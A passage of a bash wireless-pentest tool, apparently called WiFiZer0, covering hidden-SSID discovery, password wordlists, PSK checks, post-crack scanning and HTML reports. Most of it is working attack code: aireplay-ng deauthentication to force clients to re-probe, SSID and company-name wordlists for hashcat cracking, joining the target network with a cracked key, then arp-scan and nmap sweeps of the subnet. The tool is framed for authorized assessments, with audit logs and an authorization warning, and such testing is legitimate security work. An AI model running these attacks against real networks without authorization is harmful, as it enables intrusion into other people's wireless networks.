                        -Y "wlan.fc.type_subtype==5 || wlan.fc.type_subtype==8" \
                        -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | sort -u)

        if [[ $found -eq 0 && -n "$TAB_HIDDEN_TARGET_BSSID" ]]; then
            t_info "No SSIDs found passively. Sending deauth to force re-probe ..."
            aireplay-ng -0 3 -a "$TAB_HIDDEN_TARGET_BSSID" "$mon" &>/dev/null
            sleep 5
            local cap_prefix2="${out_dir}/hidden_deauth_${ts}"
            airodump-ng --output-format pcap -w "$cap_prefix2" "$mon" &>/dev/null &
            local dump2=$!
            sleep 15
            kill "$dump2" 2>/dev/null || true
            sleep 1
            local cap2="${cap_prefix2}-01.cap"
            if [[ -f "$cap2" ]]; then
                while IFS=$'\t' read -r src ssid; do
                    [[ -z "$ssid" || "$ssid" == "<hidden>" ]] && continue
                    t_ok "SSID (via deauth): '$ssid'  (from: $src)"
                    audit_log "HIDDEN SSID DEAUTH: ssid='$ssid' bssid=$src"
                    (( found++ )) || true
                done < <(tshark -r "$cap2" -Y "wlan.fc.type_subtype==5" \
                                -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | sort -u)
            fi
        fi

        [[ $found -eq 0 ]] && t_warn "No hidden SSIDs discovered in this scan window."
    fi

    hash_file "${cap_file:-/dev/null}" 2>/dev/null || true
    restore_single_interface "$mon"
    audit_log "HIDDEN SSID END"
}

discover_hidden_ssids_launcher() {
    draw_banner
    if [[ -z "$TARGET_BSSID" ]]; then
        dialog --title " Target Required " \
               --msgbox "\n  Set a target BSSID first (menu item 1 or 2).\n  This attack targets a specific AP." 8 52
        return
    fi
    TAB_HIDDEN_TARGET_BSSID="$TARGET_BSSID"
    local iface; iface=$(pick_interface "Interface for hidden SSID discovery:") || return
    SELECTED_IFACE="$iface"
    spawn_tab "HiddenSSID" "tab_discover_hidden_ssids"
    notify_tab_launched "HiddenSSID"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 9 — WORDLIST MANAGER
# ════════════════════════════════════════════════════════════

generate_target_wordlist() {
    local ssid="${1:-$TARGET_SSID}"
    local company="${2:-$TAB_WL_COMPANY}"
    [[ -z "$ssid" && -z "$company" ]] && return 1

    local wl_dir="${OUTPUT_DIR}/wordlists"
    mkdir -p "$wl_dir"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local safe_name; safe_name=$(printf '%s' "${ssid:-$company}" | tr -cs 'a-zA-Z0-9_-' '_')
    local outfile="${wl_dir}/target_${safe_name}_${ts}.txt"

    local year; year=$(date +%Y)
    local prev_year=$(( year - 1 ))
    local -a words=()

    # SSID mutations
    if [[ -n "$ssid" ]]; then
        words+=("$ssid" "${ssid}1" "${ssid}12" "${ssid}123" "${ssid}1234"
                "${ssid}${year}" "${ssid}${prev_year}"
                "${ssid}!" "${ssid}@" "${ssid}#"
                "${ssid}${year}!" "${ssid}${year}@"
                "${ssid,,}" "${ssid^^}"
                "${ssid,,}${year}" "${ssid,,}${year}!"
                "${ssid^^}${year}" "${ssid^^}${year}!")
    fi
    # Company mutations
    if [[ -n "$company" ]]; then
        words+=("$company" "${company}1" "${company}12" "${company}123" "${company}1234"
                "${company}${year}" "${company}${prev_year}"
                "${company}!" "${company}@" "${company}#"
                "${company}${year}!" "${company}${year}@"
                "${company,,}" "${company^^}"
                "${company,,}${year}" "${company,,}${year}!"
                "${company^^}${year}" "${company^^}${year}!")
    fi
    # Common keyboard walks and defaults
    words+=("password" "password1" "password123" "Password1" "Password1!"
            "admin" "admin123" "Admin123" "admin@123"
            "welcome" "welcome1" "Welcome1" "Welcome1!"
            "12345678" "123456789" "1234567890"
            "qwerty123" "Qwerty123" "letmein" "changeme"
            "wireless" "Wireless1" "WiFi${year}" "wifi${year}")

    printf '%s\n' "${words[@]}" | sort -u > "$outfile"
    echo "$outfile"
}

wordlist_manager() {
    draw_banner
    while true; do
        local wl_size=0
        [[ -n "$TAB_WL_FILE" && -f "$TAB_WL_FILE" ]] && \
            wl_size=$(wc -l < "$TAB_WL_FILE" 2>/dev/null || echo 0)
        local cur_wl="${TAB_WL_FILE:-none}"
        local choice
        choice=$(dialog --title " Wordlist Manager " \
            --menu "\n  Current wordlist: ${cur_wl}\n  Entries: ${wl_size}\n" \
            18 70 5 \
            "a" "  Generate target-specific wordlist (SSID + company mutations)" \
            "b" "  CeWL web crawl — harvest words from company website" \
            "c" "  Deduplicate + sort current wordlist" \
            "d" "  Resume last hashcat session (--restore)" \
            "e" "  Set active wordlist file path" \
            3>&1 1>&2 2>&3) || return

        case "$choice" in
            a)
                local ssid_in
                ssid_in=$(dialog --title " SSID " \
                    --inputbox "\n  SSID to generate mutations for:" \
                    8 58 "${TARGET_SSID:-}" 3>&1 1>&2 2>&3) || continue
                local company_in
                company_in=$(dialog --title " Company Name " \
                    --inputbox "\n  Company / organization name (optional):" \
                    8 58 "$TAB_WL_COMPANY" 3>&1 1>&2 2>&3) || continue
                TAB_WL_COMPANY="$company_in"
                local gen_out
                gen_out=$(generate_target_wordlist "$ssid_in" "$company_in")
                if [[ -n "$gen_out" && -f "$gen_out" ]]; then
                    local n; n=$(wc -l < "$gen_out")
                    TAB_WL_FILE="$gen_out"
                    dialog --title " Wordlist Generated " \
                           --msgbox "\n  Generated $n mutations.\n\n  Saved: $gen_out\n\n  Set as active wordlist." 10 62
                    audit_log "WORDLIST GENERATED: $gen_out ($n entries)"
                fi
                ;;
            b)
                if ! command -v cewl &>/dev/null; then
                    dialog --title " CeWL Not Found " \
                           --msgbox "\n  cewl is not installed.\n\n  Install: gem install cewl\n  or: apt install cewl" 10 50
                    continue
                fi
                local url_in
                url_in=$(dialog --title " CeWL URL " \
                    --inputbox "\n  Enter company website URL:" \
                    8 62 "$TAB_WL_URL" 3>&1 1>&2 2>&3) || continue
                [[ -z "$url_in" ]] && continue
                TAB_WL_URL="$url_in"
                local cewl_out="${OUTPUT_DIR}/wordlists/cewl_$(date +%Y%m%d_%H%M%S).txt"
                mkdir -p "${OUTPUT_DIR}/wordlists"
                dialog --title " CeWL Crawling ... " \
                       --infobox "\n  Crawling: $url_in\n  Depth: 2  Min word: 5\n  This may take a minute ..." 9 60
                cewl -d 2 -m 5 -w "$cewl_out" "$url_in" &>/dev/null && {
                    local n; n=$(wc -l < "$cewl_out" 2>/dev/null || echo 0)
                    TAB_WL_FILE="$cewl_out"
                    dialog --title " CeWL Complete " \
                           --msgbox "\n  Harvested $n words from $url_in\n  Saved: $cewl_out" 9 62
                    audit_log "CEWL CRAWL: $cewl_out ($n words) from $url_in"
                } || dialog --title " CeWL Failed " \
                           --msgbox "\n  CeWL crawl failed.\n  Check URL and internet connectivity." 8 52
                ;;
            c)
                if [[ -z "$TAB_WL_FILE" || ! -f "$TAB_WL_FILE" ]]; then
                    dialog --title " No Wordlist " \
                           --msgbox "\n  No active wordlist set.\n  Generate or set one first." 8 48
                    continue
                fi
                dialog --title " Deduplicating ... " \
                       --infobox "\n  Sorting and deduplicating:\n  $TAB_WL_FILE" 7 62
                local tmpf="${TMPDIR_PT}/wl_dedup_$$"
                sort -u "$TAB_WL_FILE" > "$tmpf" && mv "$tmpf" "$TAB_WL_FILE"
                local n; n=$(wc -l < "$TAB_WL_FILE" 2>/dev/null || echo 0)
                dialog --title " Done " \
                       --msgbox "\n  Deduplication complete.\n  Unique entries: $n\n  File: $TAB_WL_FILE" 9 62
                ;;
            d)
                if [[ -z "$TARGET_SSID" ]]; then
                    dialog --title " No Target " \
                           --msgbox "\n  No target SSID set.\n  Scan and select a target first." 8 48
                    continue
                fi
                local session_name; session_name="wifizer0_$(printf '%s' "$TARGET_SSID" | tr -cs 'a-z0-9' '_' | tr '[:upper:]' '[:lower:]')"
                dialog --title " Resuming Hashcat ... " \
                       --infobox "\n  Resuming session: $session_name\n  hashcat --restore" 7 52
                hashcat --restore --session="$session_name" 2>&1 | head -20 || \
                    dialog --title " Resume Failed " \
                           --msgbox "\n  No saved session found for: $session_name\n\n  Run a crack first (menu item 10)." 10 58
                ;;
            e)
                local fp_in
                fp_in=$(dialog --title " Set Wordlist " \
                    --inputbox "\n  Enter path to wordlist file:" \
                    8 72 "$TAB_WL_FILE" 3>&1 1>&2 2>&3) || continue
                if [[ -f "$fp_in" ]]; then
                    TAB_WL_FILE="$fp_in"
                    # Also update hashcat default
                    TAB_HC_WORDLIST="$fp_in"
                else
                    dialog --title " File Not Found " \
                           --msgbox "\n  File not found:\n  $fp_in" 8 62
                fi
                ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FEATURE 10 — PSK VERIFICATION
# ════════════════════════════════════════════════════════════

verify_psk_launcher() {
    draw_banner
    require_target || return

    # Try to pre-fill PSK from cracked_psk.txt if it exists
    if [[ -z "$TAB_PSK_VERIFY_PSK" ]]; then
        local crack_file
        while IFS= read -r f; do
            if [[ -f "$f" && -s "$f" ]]; then
                local candidate; candidate=$(head -1 "$f")
                if validate_psk "$candidate"; then
                    TAB_PSK_VERIFY_PSK="$candidate"
                    TAB_PSK_VERIFY_SSID="$TARGET_SSID"
                    TAB_PSK_VERIFY_BSSID="$TARGET_BSSID"
                    break
                fi
            fi
        done < <(find "$OUTPUT_DIR" -name "cracked_psk.txt" 2>/dev/null | sort -r)
    fi

    # Confirm / edit PSK
    local psk_in
    psk_in=$(dialog --title " PSK Verification — Passphrase " \
        --inputbox "\n  Enter PSK to verify (from cracking session):\n\n  SSID  : ${TARGET_SSID}\n  BSSID : ${TARGET_BSSID}" \
        12 68 "$TAB_PSK_VERIFY_PSK" 3>&1 1>&2 2>&3) || return
    [[ -z "$psk_in" ]] && return
    if ! validate_psk "$psk_in"; then
        dialog --title " Invalid PSK " \
               --msgbox "\n  PSK must be 8-63 printable ASCII characters." 8 48
        return
    fi
    TAB_PSK_VERIFY_PSK="$psk_in"
    TAB_PSK_VERIFY_SSID="$TARGET_SSID"
    TAB_PSK_VERIFY_BSSID="$TARGET_BSSID"

    local iface; iface=$(pick_interface "Interface for PSK verification (managed mode):") || return
    TAB_PSK_VERIFY_IFACE="$iface"
    SELECTED_IFACE="$iface"

    spawn_tab "PSKVerify" "tab_verify_psk"
    notify_tab_launched "PSKVerify"
}

tab_verify_psk() {
    t_head "PSK Verification — Live Connectivity Test"
    t_data "SSID    : $TAB_PSK_VERIFY_SSID"
    t_data "BSSID   : $TAB_PSK_VERIFY_BSSID"
    t_data "PSK     : ${TAB_PSK_VERIFY_PSK:0:4}****"
    t_data "Iface   : $TAB_PSK_VERIFY_IFACE"
    audit_log "PSK VERIFY START: ssid='$TAB_PSK_VERIFY_SSID' bssid=$TAB_PSK_VERIFY_BSSID iface=$TAB_PSK_VERIFY_IFACE"
    _line

    if [[ -z "$TAB_PSK_VERIFY_SSID" || -z "$TAB_PSK_VERIFY_PSK" || -z "$TAB_PSK_VERIFY_IFACE" ]]; then
        t_err "Missing required parameters (SSID, PSK, or interface)."
        return 1
    fi
    if ! command -v wpa_supplicant &>/dev/null; then
        t_err "wpa_supplicant not found. Install: apt install wpasupplicant"
        return 1
    fi

    # Build temp wpa_supplicant config
    local conf="${TMPDIR_PT}/wpa_verify_$$.conf"
    cat > "$conf" << WPAEOF
ctrl_interface=/tmp/wpa_ctrl_$$
network={
    ssid="${TAB_PSK_VERIFY_SSID}"
    $([ -n "$TAB_PSK_VERIFY_BSSID" ] && printf 'bssid=%s\n' "$TAB_PSK_VERIFY_BSSID")
    psk="${TAB_PSK_VERIFY_PSK}"
    key_mgmt=WPA-PSK
}
WPAEOF
    chmod 600 "$conf"

    # Kill any existing wpa_supplicant on this interface
    pkill -f "wpa_supplicant.*${TAB_PSK_VERIFY_IFACE}" 2>/dev/null || true
    sleep 1

    t_info "Starting wpa_supplicant ..."
    wpa_supplicant -B -i "$TAB_PSK_VERIFY_IFACE" -c "$conf" \
                   -P "${TMPDIR_PT}/wpa_pid_$$.pid" &>/dev/null
    t_ok "wpa_supplicant started."

    # Poll for connection state (15-second timeout)
    local state="DISCONNECTED" timeout=15
    for i in $(seq 1 $timeout); do
        sleep 1
        state=$(wpa_cli -i "$TAB_PSK_VERIFY_IFACE" status 2>/dev/null | \
                awk -F= '/wpa_state/{print $2}')
        t_data "[$i/${timeout}s]  wpa_state: ${state:-?}"
        if [[ "$state" == "COMPLETED" ]]; then
            break
        fi
    done

    # Clean up wpa_supplicant
    pkill -f "wpa_supplicant.*${TAB_PSK_VERIFY_IFACE}" 2>/dev/null || true
    sleep 1

    local out_dir; out_dir=$(make_outdir "psk_verify")
    if [[ "$state" == "COMPLETED" ]]; then
        t_ok "PSK VERIFIED — Authentication SUCCESSFUL!"
        printf 'PSK: %s\nSSID: %s\nBSSID: %s\nVerified: %s\n' \
            "$TAB_PSK_VERIFY_PSK" "$TAB_PSK_VERIFY_SSID" \
            "$TAB_PSK_VERIFY_BSSID" "$(date '+%Y-%m-%d %H:%M:%S')" \
            > "${out_dir}/psk_verified.txt"
        t_ok "Result saved: ${out_dir}/psk_verified.txt"
        audit_log "PSK VERIFIED: ssid='$TAB_PSK_VERIFY_SSID' bssid=$TAB_PSK_VERIFY_BSSID psk='${TAB_PSK_VERIFY_PSK:0:4}****'"
        t_info "Use menu item 18 for post-crack network enumeration."
    else
        t_warn "PSK verification FAILED (state: $state)."
        t_data "Possible causes: wrong PSK, AP not in range, or MFP blocking."
        audit_log "PSK VERIFY FAILED: ssid='$TAB_PSK_VERIFY_SSID' state=$state"
    fi
    rm -f "$conf"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 11 — POST-CRACK NETWORK ENUMERATION
# ════════════════════════════════════════════════════════════

post_crack_enum_launcher() {
    draw_banner
    require_target || return

    if [[ -z "$TAB_PSK_VERIFY_PSK" ]]; then
        # Try to load from cracked_psk.txt
        while IFS= read -r f; do
            if [[ -f "$f" && -s "$f" ]]; then
                local candidate; candidate=$(head -1 "$f")
                validate_psk "$candidate" && { TAB_PSK_VERIFY_PSK="$candidate"; break; }
            fi
        done < <(find "$OUTPUT_DIR" -name "cracked_psk.txt" 2>/dev/null | sort -r)
    fi

    if [[ -z "$TAB_PSK_VERIFY_PSK" ]]; then
        dialog --title " No PSK Available " \
               --msgbox "\n  No cracked PSK found.\n\n  Run Hashcat (item 10) or Verify PSK (item 17) first.\n  Cracked PSK is auto-saved to cracked_psk.txt." 11 58
        return
    fi

    TAB_PSK_VERIFY_SSID="$TARGET_SSID"
    TAB_PSK_VERIFY_BSSID="$TARGET_BSSID"
    local iface; iface=$(pick_interface "Interface for network enumeration:") || return
    TAB_PSK_VERIFY_IFACE="$iface"
    SELECTED_IFACE="$iface"

    dialog --title " Post-Crack Enumeration " \
           --yesno "\n  Connect to '$TARGET_SSID' using cracked PSK\n  and perform network enumeration.\n\n  PSK   : ${TAB_PSK_VERIFY_PSK:0:4}****\n  Iface : $iface\n\n  WARNING: This will join the target network.\n  Ensure written authorization covers this action.\n\n  Continue?" \
           16 64
    [[ $? -ne 0 ]] && return

    spawn_tab "PostEnum" "tab_post_crack_enum"
    notify_tab_launched "PostEnum"
}

tab_post_crack_enum() {
    t_head "Post-Crack Network Enumeration"
    t_data "SSID    : $TAB_PSK_VERIFY_SSID"
    t_data "BSSID   : $TAB_PSK_VERIFY_BSSID"
    t_data "Iface   : $TAB_PSK_VERIFY_IFACE"
    audit_log "POST ENUM START: ssid='$TAB_PSK_VERIFY_SSID' iface=$TAB_PSK_VERIFY_IFACE"
    _line

    if ! command -v wpa_supplicant &>/dev/null; then
        t_err "wpa_supplicant not found. Install: apt install wpasupplicant"
        return 1
    fi

    # Step 1: Connect using wpa_supplicant
    local conf="${TMPDIR_PT}/enum_wpa_$$.conf"
    cat > "$conf" << WPAEOF
ctrl_interface=/tmp/wpa_enum_$$
network={
    ssid="${TAB_PSK_VERIFY_SSID}"
    $([ -n "$TAB_PSK_VERIFY_BSSID" ] && printf 'bssid=%s\n' "$TAB_PSK_VERIFY_BSSID")
    psk="${TAB_PSK_VERIFY_PSK}"
    key_mgmt=WPA-PSK
}
WPAEOF
    chmod 600 "$conf"
    pkill -f "wpa_supplicant.*${TAB_PSK_VERIFY_IFACE}" 2>/dev/null || true
    sleep 1
    t_info "Connecting to $TAB_PSK_VERIFY_SSID ..."
    wpa_supplicant -B -i "$TAB_PSK_VERIFY_IFACE" -c "$conf" \
                   -P "${TMPDIR_PT}/enum_pid_$$.pid" &>/dev/null

    local state="" timeout=20
    for i in $(seq 1 $timeout); do
        sleep 1
        state=$(wpa_cli -i "$TAB_PSK_VERIFY_IFACE" status 2>/dev/null | \
                awk -F= '/wpa_state/{print $2}')
        t_data "[$i/${timeout}s]  state: ${state:-?}"
        [[ "$state" == "COMPLETED" ]] && break
    done

    if [[ "$state" != "COMPLETED" ]]; then
        t_err "Failed to associate (state: $state). Aborting enumeration."
        pkill -f "wpa_supplicant.*${TAB_PSK_VERIFY_IFACE}" 2>/dev/null || true
        rm -f "$conf"
        audit_log "POST ENUM FAILED: could not connect, state=$state"
        return 1
    fi
    t_ok "Associated with $TAB_PSK_VERIFY_SSID"

    # Step 2: Get IP via DHCP
    t_info "Requesting DHCP lease ..."
    if command -v dhclient &>/dev/null; then
        dhclient "$TAB_PSK_VERIFY_IFACE" &>/dev/null &
        sleep 6
        kill "$!" 2>/dev/null || true
    elif command -v dhcpcd &>/dev/null; then
        dhcpcd "$TAB_PSK_VERIFY_IFACE" &>/dev/null &
        sleep 6
        kill "$!" 2>/dev/null || true
    else
        t_warn "dhclient/dhcpcd not found — trying ip dhcp fallback."
        sleep 3
    fi

    local my_ip; my_ip=$(ip addr show "$TAB_PSK_VERIFY_IFACE" 2>/dev/null | \
                         awk '/inet /{print $2}' | head -1)
    t_ok "Interface IP: ${my_ip:-unknown}"

    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local enum_file="${OUTPUT_DIR}/enum_${ts}.txt"
    {
        echo "Post-Crack Network Enumeration Report"
        echo "======================================"
        echo "SSID      : $TAB_PSK_VERIFY_SSID"
        echo "BSSID     : $TAB_PSK_VERIFY_BSSID"
        echo "Interface : $TAB_PSK_VERIFY_IFACE"
        echo "Our IP    : ${my_ip:-unknown}"
        echo "Date      : $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
    } > "$enum_file"

    # Step 3: ARP scan
    if command -v arp-scan &>/dev/null; then
        t_info "Running ARP host discovery ..."
        t_cmd "arp-scan -I $TAB_PSK_VERIFY_IFACE -l"
        {
            echo "=== ARP Scan (arp-scan -l) ==="
            arp-scan -I "$TAB_PSK_VERIFY_IFACE" -l 2>&1 || echo "(arp-scan failed)"
            echo ""
        } | tee -a "$enum_file"
    else
        t_warn "arp-scan not found — skipping ARP discovery. Install: apt install arp-scan"
    fi

    # Step 4: nmap subnet scan
    if [[ -n "$my_ip" ]] && command -v nmap &>/dev/null; then
        local subnet; subnet="${my_ip%/*}/24"
        t_info "Running nmap ping scan on $subnet ..."
        t_cmd "nmap -sn $subnet"
        {
            echo "=== nmap Ping Scan ($subnet) ==="
            nmap -sn "$subnet" 2>&1 || echo "(nmap failed)"
            echo ""
        } | tee -a "$enum_file"
    else
        t_warn "nmap not found or no IP — skipping subnet scan. Install: apt install nmap"
    fi

    hash_file "$enum_file"
    t_ok "Enumeration results saved: $enum_file"
    audit_log "POST ENUM COMPLETE: $enum_file"

    # Step 5: Cleanup — disconnect and release DHCP
    t_info "Disconnecting ..."
    pkill -f "wpa_supplicant.*${TAB_PSK_VERIFY_IFACE}" 2>/dev/null || true
    dhclient -r "$TAB_PSK_VERIFY_IFACE" &>/dev/null || \
        dhcpcd -k "$TAB_PSK_VERIFY_IFACE" &>/dev/null || true
    ip addr flush dev "$TAB_PSK_VERIFY_IFACE" 2>/dev/null || true
    rm -f "$conf"
    t_ok "Disconnected and DHCP lease released."
    audit_log "POST ENUM END"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 12 — ENGAGEMENT PROFILES
# ════════════════════════════════════════════════════════════

profile_save_current() {
    [[ -z "$PROFILES_DIR" ]] && return 1
    local pdir="${PROFILES_DIR}/${ACTIVE_PROFILE}"
    mkdir -p "$pdir"
    save_session
    for f in session.sh scope.txt ap_database.tsv client_database.tsv; do
        [[ -f "${OUTPUT_DIR}/${f}" ]] && cp "${OUTPUT_DIR}/${f}" "${pdir}/${f}"
    done
    audit_log "PROFILE SAVED: $ACTIVE_PROFILE → $pdir"
}

profile_load() {
    local name="$1"
    [[ -z "$name" || -z "$PROFILES_DIR" ]] && return 1
    local pdir="${PROFILES_DIR}/${name}"
    if [[ ! -d "$pdir" ]]; then
        dialog --title " Profile Not Found " \
               --msgbox "\n  Profile '$name' not found.\n  Path: $pdir" 8 54
        return 1
    fi
    # Copy profile files into OUTPUT_DIR
    for f in session.sh scope.txt ap_database.tsv client_database.tsv; do
        [[ -f "${pdir}/${f}" ]] && cp "${pdir}/${f}" "${OUTPUT_DIR}/${f}"
    done
    ACTIVE_PROFILE="$name"
    SCOPE_FILE="${OUTPUT_DIR}/scope.txt"
    # Re-source session state
    if [[ -f "${OUTPUT_DIR}/session.sh" ]]; then
        source "${OUTPUT_DIR}/session.sh"
    fi
    audit_log "PROFILE LOADED: $name"
    dialog --title " Profile Loaded " \
           --infobox "\n  Profile '$name' loaded.\n  Target: ${TARGET_SSID:-none}" 7 52
    sleep 1
}

offer_profile_picker() {
    [[ -z "$PROFILES_DIR" || ! -d "$PROFILES_DIR" ]] && return
    local -a profiles=()
    mapfile -t profiles < <(ls -1 "$PROFILES_DIR" 2>/dev/null)
    [[ ${#profiles[@]} -eq 0 ]] && return

    local -a menu_items=()
    for p in "${profiles[@]}"; do
        menu_items+=("$p" "  Profile: $p")
    done

    local choice
    choice=$(dialog --title " Engagement Profiles " \
        --default-item "$ACTIVE_PROFILE" \
        --menu "\n  Load an existing engagement profile?\n  (or Cancel to start fresh)\n" \
        14 58 "${#profiles[@]}" \
        "${menu_items[@]}" \
        3>&1 1>&2 2>&3) || return
    [[ -n "$choice" ]] && profile_load "$choice"
}

profile_manager() {
    draw_banner
    while true; do
        local -a profiles=()
        [[ -n "$PROFILES_DIR" && -d "$PROFILES_DIR" ]] && \
            mapfile -t profiles < <(ls -1 "$PROFILES_DIR" 2>/dev/null)
        local choice
        choice=$(dialog --title " Engagement Profiles  [active: ${ACTIVE_PROFILE}] " \
            --menu "\n  Manage named engagement profiles.\n  Each profile stores scope, target, and scan databases.\n" \
            18 66 5 \
            "new"    "  Create new profile" \
            "load"   "  Load existing profile  [${#profiles[@]} available]" \
            "save"   "  Save current state to profile: ${ACTIVE_PROFILE}" \
            "delete" "  Delete a profile" \
            "info"   "  Show active profile info" \
            3>&1 1>&2 2>&3) || return

        case "$choice" in
            new)
                local pname
                pname=$(dialog --title " New Profile " \
                    --inputbox "\n  Enter profile name (letters/digits/- only):" \
                    9 58 "" 3>&1 1>&2 2>&3) || continue
                pname="${pname// /_}"
                if [[ ! "$pname" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                    dialog --title " Invalid Name " \
                           --msgbox "\n  '$pname' is not a valid profile name.\n  Use letters, digits, underscores, hyphens only." 8 56
                    continue
                fi
                ACTIVE_PROFILE="$pname"
                mkdir -p "${PROFILES_DIR}/${pname}"
                profile_save_current
                dialog --title " Profile Created " \
                       --infobox "\n  Profile '$pname' created and set as active." 6 54
                sleep 1
                ;;
            load)
                if [[ ${#profiles[@]} -eq 0 ]]; then
                    dialog --title " No Profiles " \
                           --msgbox "\n  No profiles found.\n  Create one first." 8 44
                    continue
                fi
                local menu_items=()
                for p in "${profiles[@]}"; do
                    menu_items+=("$p" "  Profile: $p")
                done
                local sel
                sel=$(dialog --title " Load Profile " \
                    --default-item "$ACTIVE_PROFILE" \
                    --menu "\n  Select profile to load:" \
                    14 58 "${#profiles[@]}" \
                    "${menu_items[@]}" \
                    3>&1 1>&2 2>&3) || continue
                [[ -n "$sel" ]] && profile_load "$sel"
                ;;
            save)
                profile_save_current
                dialog --title " Saved " \
                       --infobox "\n  Profile '${ACTIVE_PROFILE}' saved." 6 44
                sleep 1
                ;;
            delete)
                if [[ ${#profiles[@]} -eq 0 ]]; then
                    dialog --title " No Profiles " \
                           --msgbox "\n  No profiles to delete." 7 40
                    continue
                fi
                local del_items=()
                for p in "${profiles[@]}"; do
                    del_items+=("$p" "  Profile: $p")
                done
                local del_sel
                del_sel=$(dialog --title " Delete Profile " \
                    --menu "\n  Select profile to delete:" \
                    14 58 "${#profiles[@]}" \
                    "${del_items[@]}" \
                    3>&1 1>&2 2>&3) || continue
                dialog --title " Confirm Delete " \
                       --yesno "\n  Delete profile '$del_sel'?\n  This cannot be undone." 8 46
                if [[ $? -eq 0 ]]; then
                    rm -rf "${PROFILES_DIR:?}/${del_sel}"
                    [[ "$ACTIVE_PROFILE" == "$del_sel" ]] && ACTIVE_PROFILE="default"
                    audit_log "PROFILE DELETED: $del_sel"
                fi
                ;;
            info)
                local pdir="${PROFILES_DIR}/${ACTIVE_PROFILE}"
                local pinfo="  Active profile : ${ACTIVE_PROFILE}\n  Path           : ${pdir}\n"
                pinfo+="  Target SSID    : ${TARGET_SSID:-none}\n"
                pinfo+="  Target BSSID   : ${TARGET_BSSID:-none}\n"
                pinfo+="  Scope file     : ${SCOPE_FILE:-none}\n"
                if [[ -f "${OUTPUT_DIR}/ap_database.tsv" ]]; then
                    local n_ap; n_ap=$(grep -c '^[^#]' "${OUTPUT_DIR}/ap_database.tsv" 2>/dev/null || echo 0)
                    pinfo+="  APs in DB      : $n_ap\n"
                fi
                dialog --title " Profile Info " \
                       --msgbox "\n${pinfo}" 14 62
                ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FEATURE 4 (HTML) — REPORT GENERATION
# ════════════════════════════════════════════════════════════

generate_report() {
    draw_banner

    # Collect report metadata
    local client_name
    client_name=$(dialog --title " Report — Client Name " \
        --inputbox "\n  Enter client / organization name:" \
        8 60 "" 3>&1 1>&2 2>&3) || return
    [[ -z "$client_name" ]] && client_name="Confidential Client"

    local assessor
    assessor=$(dialog --title " Report — Assessor Name " \
        --inputbox "\n  Enter assessor / tester name:" \
        8 60 "" 3>&1 1>&2 2>&3) || return
    [[ -z "$assessor" ]] && assessor="WiFiZer0 Operator"

    dialog --title " Generating HTML Report ... " \
           --infobox "\n  Parsing audit log and evidence files ..." 6 52
    sleep 1

    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local report_file="${OUTPUT_DIR}/report_${ts}.html"
    local report_date; report_date=$(date '+%Y-%m-%d')

    # Parse audit log for findings
    local crit_count=0 high_count=0 med_count=0 info_count=0
    local findings_html=""

    if [[ -f "$AUDIT_LOG" ]]; then
        # Critical: open network data captured
        while IFS= read -r line; do
            if echo "$line" | grep -qE 'CAPTURED|HANDSHAKE CAPTURED'; then
                (( crit_count++ )) || true
                local ts_l; ts_l=$(echo "$line" | awk '{print $1,$2}')
                findings_html+="<tr class='critical'><td>Critical</td><td>Wireless Credential Capture</td><td>${ts_l}</td><td>Authentication material captured from target network.</td></tr>\n"
            fi
        done < "$AUDIT_LOG"

        # High: PSK cracked or WPS pwned
        while IFS= read -r line; do
            if echo "$line" | grep -qE 'HASHCAT CRACKED|WPS SUCCESS|PSK VERIFIED'; then
                (( high_count++ )) || true
                local ts_l; ts_l=$(echo "$line" | awk '{print $1,$2}')
                local desc; desc=$(echo "$line" | sed 's/^[^ ]* [^ ]* //')
                findings_html+="<tr class='high'><td>High</td><td>Weak Pre-Shared Key</td><td>${ts_l}</td><td>${desc}</td></tr>\n"
            fi
        done < "$AUDIT_LOG"

        # Medium: APs without MFP
        if [[ -f "$AP_DB" ]]; then
            local mfp_none_count
            mfp_none_count=$(grep -v '^#' "$AP_DB" 2>/dev/null | \
                awk -F'\t' '($9=="none" || $9=="") && $5~/WPA/' | wc -l || echo 0)
            if [[ "$mfp_none_count" -gt 0 ]]; then
                (( med_count++ )) || true
                findings_html+="<tr class='medium'><td>Medium</td><td>802.11w MFP Not Enabled</td><td>${report_date}</td><td>${mfp_none_count} WPA2 AP(s) do not require Management Frame Protection, leaving clients vulnerable to deauthentication attacks.</td></tr>\n"
            fi
        fi

        # Informational: failed attempts
        while IFS= read -r line; do
            if echo "$line" | grep -qi 'FAILED\|NO.*CRACK'; then
                (( info_count++ )) || true
            fi
        done < "$AUDIT_LOG"
    fi

    # Build evidence file list
    local evidence_html=""
    while IFS= read -r f; do
        [[ "$f" == *.sha256 ]] && continue
        local fsize; fsize=$(du -sh "$f" 2>/dev/null | cut -f1)
        local fhash=""
        [[ -f "${f}.sha256" ]] && fhash=$(cut -d' ' -f1 < "${f}.sha256" 2>/dev/null)
        evidence_html+="<tr><td>${f##"$OUTPUT_DIR/"}</td><td>${fsize:-?}</td><td>${fhash:0:16}...</td></tr>\n"
    done < <(find "$OUTPUT_DIR" -type f 2>/dev/null | sort)

    # Write HTML report
    cat > "$report_file" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WiFiZer0 Wireless Assessment Report — ${client_name}</title>
<style>
body{font-family:Arial,sans-serif;margin:40px;color:#222;background:#f9f9f9}
h1{color:#d97706;border-bottom:2px solid #d97706;padding-bottom:8px}
h2{color:#0369a1;margin-top:30px}
table{width:100%;border-collapse:collapse;margin-top:10px}
th{background:#0369a1;color:#fff;padding:8px;text-align:left}
td{padding:7px;border-bottom:1px solid #ddd}
tr:nth-child(even){background:#f0f4f8}
.critical td:first-child{color:#fff;background:#dc2626;font-weight:bold;border-radius:3px;padding:3px 6px}
.high td:first-child{color:#fff;background:#ea580c;font-weight:bold;border-radius:3px;padding:3px 6px}
.medium td:first-child{color:#000;background:#eab308;font-weight:bold;border-radius:3px;padding:3px 6px}
.info td:first-child{color:#000;background:#60a5fa;font-weight:bold;border-radius:3px;padding:3px 6px}
